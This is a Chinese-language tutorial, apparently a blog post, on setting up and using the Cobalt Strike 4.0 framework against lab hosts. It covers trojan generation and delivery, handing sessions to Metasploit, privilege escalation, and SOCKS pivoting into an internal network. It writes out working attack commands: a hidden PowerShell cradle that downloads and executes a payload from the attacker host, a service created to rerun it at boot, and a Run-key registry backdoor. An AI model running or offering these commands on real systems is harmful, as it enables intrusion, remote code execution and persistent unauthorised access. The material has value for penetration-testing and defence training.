
# 简介
	Cobalt Strike 一款以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。<br />	Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等强大的功能！


# 安装

## 环境
服务端：kali（192.168.1.28）<br />客户端：Win10


## 服务端
将文件上传到kali中<br />![](https://img-blog.csdnimg.cn/104e601b864f4ff6957beb4843ec1fd6.png#crop=0&crop=0&crop=1&crop=1&id=Tp3ll&originHeight=112&originWidth=746&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

进入`cs4.0中文`目录输入命令
```
./teamserver [kali-ip] [密码]
```
![](https://img-blog.csdnimg.cn/3801f93108e546aea251853dc95db172.png#crop=0&crop=0&crop=1&crop=1&id=oPLtj&originHeight=158&originWidth=1077&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 客户端
进入文件夹双击客户端启动脚本<br />![](https://img-blog.csdnimg.cn/6618f349ab8a4aefb9b97d39352b1f37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=tisRk&originHeight=220&originWidth=735&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**主机：**为我们刚刚建立服务器的IP地址<br />**端口：**端口不用管 默认就可以<br />**用户名：**随意都行 （默认就可以）<br />**密码：**输入刚才服务端密码<br />![](https://img-blog.csdnimg.cn/4f15b419c795447cb58b64c1e053f356.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_14,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=dETAz&originHeight=291&originWidth=504&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

检查指纹<br />![](https://img-blog.csdnimg.cn/2b9c503129a84f89b0e32509a36ffd7b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_18,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=IzgCE&originHeight=212&originWidth=638&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

成功连接 ![](https://img-blog.csdnimg.cn/b96693ef59144ef1a600f4a5eb290acc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Yhczq&originHeight=524&originWidth=973&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# 软件说明

## 每个按钮的意思
![](https://img-blog.csdnimg.cn/64151d72241a4a17885ded497d882dbb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_12,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=T6QZ5&originHeight=531&originWidth=437&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# 演示实例

## 环境
攻击机：kali（192.168.1.28）<br />边缘主机：Win7（192.168.1.8、10.10.10.2）<br />内网主机：Winxp（10.10.10.3）


## 实例
创建监听 ![](https://img-blog.csdnimg.cn/86e1f5ed2e4448c1a544f23dfaa7af18.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=xZxka&originHeight=527&originWidth=1165&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/54fcf648a6e2476785e34cf87839d1f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_13,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=hAF1s&originHeight=526&originWidth=490&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/35ab7ea5595942ea80eee2e95a5422d6.png#crop=0&crop=0&crop=1&crop=1&id=Qp2NT&originHeight=143&originWidth=870&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

创建木马<br />![](https://img-blog.csdnimg.cn/29d3bdffc2444ff3a47e64f131b57dc6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_15,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=OmBUp&originHeight=224&originWidth=554&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

选择监听器<br />![](https://img-blog.csdnimg.cn/5cf53e1f2df040e886666c74ca5ed66b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=HyNCy&originHeight=526&originWidth=701&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

选择木马保存路径<br />![](https://img-blog.csdnimg.cn/6994e2b0fc2849598502e2c21d95760e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_13,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=WUCtj&originHeight=237&originWidth=474&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/b8d706876f8f492780016365b3d21f4d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_19,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=lfbpK&originHeight=457&originWidth=689&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

开启web服务<br />![](https://img-blog.csdnimg.cn/5b78749c4ebc4613ae3af46ad2af3780.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_16,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Di8CP&originHeight=331&originWidth=560&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

选择刚刚生成的木马文件<br />![](https://img-blog.csdnimg.cn/a6f5da0da9de451ab4b5106006e77cee.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_12,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ihMip&originHeight=352&originWidth=449&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/266c03fdd6c14e8dbe6586d14d8aacf3.png#crop=0&crop=0&crop=1&crop=1&id=KRbdC&originHeight=178&originWidth=377&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在靶机运行木马<br />![](https://img-blog.csdnimg.cn/4633c2851d734de2a45872c581c254f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=hcaDp&originHeight=241&originWidth=748&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

靶机成功上线<br />![](https://img-blog.csdnimg.cn/b84f4adf50fc4faa9df2ae374f26a88b.png#crop=0&crop=0&crop=1&crop=1&id=mNEJC&originHeight=172&originWidth=867&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://img-blog.csdnimg.cn/97b04b00dbab416e81c2371f6b08bd9b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_18,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ATScH&originHeight=504&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 联动MSF（shell）
MSF开启监听
```
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.183.147
set lport 4444
run
```
![](https://img-blog.csdnimg.cn/9f77af7842af4d688373f8563ef8b3aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=hovCX&originHeight=289&originWidth=935&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

创建两个监听器，一个使用windows/beacon_http/reverse_http来监听肉鸡，另一个使用windows/foreign/reverse_http来将获取到的控制权传给msf(注意：这里的端口要与msf监听的端口一致)
![](https://img-blog.csdnimg.cn/9a8141e3c3aa498a8ad3f1d1acf93e81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_14,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=jGhR1&originHeight=525&originWidth=495&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/b63125aeeed54fa0a67c8dfe166179c1.png#crop=0&crop=0&crop=1&crop=1&id=giXtn&originHeight=111&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

当目标上线后，选择目标点击鼠标右键选择增加会话<br />![](https://img-blog.csdnimg.cn/95f97a704a3a44d6b08c069bb061b724.png#crop=0&crop=0&crop=1&crop=1&id=YIWkI&originHeight=220&originWidth=206&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://img-blog.csdnimg.cn/e2e93822246e40db94ba4c0af8fcff6a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=U7zfV&originHeight=267&originWidth=702&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

获取到的会话不稳定<br />![](https://img-blog.csdnimg.cn/eeeb9bf0edc8465aa2aec42ed583aa97.png#crop=0&crop=0&crop=1&crop=1&id=o0DcU&originHeight=166&originWidth=735&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 提权
选中目标点击鼠标右键选择执行->提权<br />![](https://img-blog.csdnimg.cn/37d81fc6388e4998b5b90b271a621822.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=me87Y&originHeight=296&originWidth=817&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

选择监听器<br />![](https://img-blog.csdnimg.cn/55f83fc2770a44009b9cfcdf404115e8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=NrI0O&originHeight=508&originWidth=756&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

提权成功<br />![](https://img-blog.csdnimg.cn/b195fbd52da94d3b840a6f208bab2c6e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=o3EzR&originHeight=347&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 权限维持
点击攻击->钓鱼攻击->script web delivery<br />![](https://img-blog.csdnimg.cn/1ede100b77a54420bf5821c8575ad22c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_11,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=QtDYf&originHeight=288&originWidth=390&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

选择监听器<br />![](https://img-blog.csdnimg.cn/7b334b7bb70345288a7d208d5812f7d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_17,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=aGDws&originHeight=527&originWidth=603&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

点击开始生成如下命令
```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.28:80/a'))"
```

在靶机上执行上面生成的命令会上线具有普通用户权限的主机<br />![](https://img-blog.csdnimg.cn/b7f415ec59184fb8a445535ff5fbba13.png#crop=0&crop=0&crop=1&crop=1&id=huBdu&originHeight=195&originWidth=1242&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

提权之后打开beacon shell并执行命令
```
shell sc create "name" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.183.28:80/a'))\""
```

![](https://img-blog.csdnimg.cn/df46091561f34702af4199f4ed243bd8.png#crop=0&crop=0&crop=1&crop=1&id=kDawD&originHeight=125&originWidth=1254&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在靶机上查看服务<br />![](https://img-blog.csdnimg.cn/66ca4179d91b4f04b4333170a50fc569.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=dj5Rk&originHeight=524&originWidth=922&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

将服务改为自动
```
shell sc config "name" start= auto
```

![](https://img-blog.csdnimg.cn/e16d52f38a67460a9250c600c805ea6e.png#crop=0&crop=0&crop=1&crop=1&id=JPbI1&originHeight=121&originWidth=460&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/33828f61f05d426680593da8979d34d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_14,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=JpWdH&originHeight=524&originWidth=523&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

当靶机重启后依旧可以拿到权限


## 注册表后门
点击攻击->生成后门->windows executable<br />![](https://img-blog.csdnimg.cn/67627f7efde347aca75b93605960b3d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_10,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=qF6kn&originHeight=204&originWidth=375&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

设置监听<br />![](https://img-blog.csdnimg.cn/77380794437440e29ec8044b7f5789e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_19,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=VlqQ5&originHeight=520&originWidth=672&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

保存到桌面<br />![](https://img-blog.csdnimg.cn/61dd5068200b4ce4b554f62acf954b61.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_19,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Jv0hf&originHeight=447&originWidth=687&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

上传木马文件，选择会话点击鼠标右键选择目标->文件管理<br />![](https://img-blog.csdnimg.cn/04a17cd3bc4e4a47b6b0ac92076edb8c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_10,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=wHnIC&originHeight=298&originWidth=377&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

选择木马文件进行上传<br />![](https://img-blog.csdnimg.cn/4826b33bc28c4db282861af553c94a6c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=tOIpq&originHeight=528&originWidth=807&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

设置为注册表后门
```
shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "keyname" /t REG_SZ /d "C:\Users\aa\Desktop\artifact.exe" /f
```

![](https://img-blog.csdnimg.cn/5724bde59d3048cf80ddc51efb6de374.png#crop=0&crop=0&crop=1&crop=1&id=cVK8J&originHeight=114&originWidth=1264&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/b1039bc032494a98a655bc4839776bdb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ujkzw&originHeight=257&originWidth=1004&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

也可以选择将exe设置为服务后门
```
shell sc create "exe" binpath= "C:\Users\abc\Desktop\artifact.exe"
```
![](https://img-blog.csdnimg.cn/db4e88f3b6584689981d6a6e90997cb0.png#crop=0&crop=0&crop=1&crop=1&id=CPO2t&originHeight=122&originWidth=762&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/7bda3f1e07b841ab918cb354073bb7e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=Jm5YZ&originHeight=524&originWidth=970&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 设置Socks代理
开启socks4a代理，通过代理进行内网渗透<br />开启socks，可以通过命令，也可以通过右键选择中转->SOCKS Server<br />![](https://img-blog.csdnimg.cn/bc60dc785db04e7da4b6ebeae91529de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_11,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=W65Fk&originHeight=210&originWidth=399&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

```
socks 12345
```
![](https://img-blog.csdnimg.cn/a3211d0875a94fba9f81282094dff6d0.png#crop=0&crop=0&crop=1&crop=1&id=Vood9&originHeight=85&originWidth=356&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

编辑`proxychains.conf` ，在文件末尾添加socks4代理服务器
```
vi /etc/proxychains.conf
```
![](https://img-blog.csdnimg.cn/997e71f83fb34ddfbbe0829fbb869065.png#crop=0&crop=0&crop=1&crop=1&id=ORXhX&originHeight=159&originWidth=363&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

使用proxychains代理扫描内网主机，socks4的代理，只能使用tcp协议，所以nmap使用的时候要使用-sT选择使用tcp协议，要使用-Pn不使用ICMP的ping确认主机存活
```
proxychains nmap -sT -Pn 10.10.10.0/24
```
![](https://img-blog.csdnimg.cn/fe2ba59468b34db3809173f43d4fd85b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=zI9h4&originHeight=536&originWidth=851&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以判断出是存在主机10.10.10.3的，对内网主机10.10.10.3进行端口扫描
```
proxychains nmap -sT -Pn 10.10.10.3
```
![](https://img-blog.csdnimg.cn/00ea372dd5554790a53072fd93bc3558.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=GOIME&originHeight=523&originWidth=916&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


## 联动MSF（扫描）
点击视图->代理信息->选择Socks4a Proxy,点击Tunnel<br />![](https://img-blog.csdnimg.cn/bbd5b6a3eb584397b631c668ea689a86.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=fMlqh&originHeight=529&originWidth=698&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://img-blog.csdnimg.cn/2f099bdb32e14038b4e57b6d56e98af9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_13,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=HN2aw&originHeight=201&originWidth=460&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

启动MSF输入方框中的内容
```
setg Proxies socks4:192.168.1.28:12345
```
![](https://img-blog.csdnimg.cn/e3691a2a6b3449cd960ae7e9789a29f8.png#crop=0&crop=0&crop=1&crop=1&id=Qk7Oe&originHeight=111&originWidth=525&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

扫描<br />![](https://img-blog.csdnimg.cn/97b2c09978bb4659ad17a2718a790130.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6bij5ZCM5a2mU0VD,size_20,color_FFFFFF,t_70,g_se,x_16#crop=0&crop=0&crop=1&crop=1&id=ga5N5&originHeight=530&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
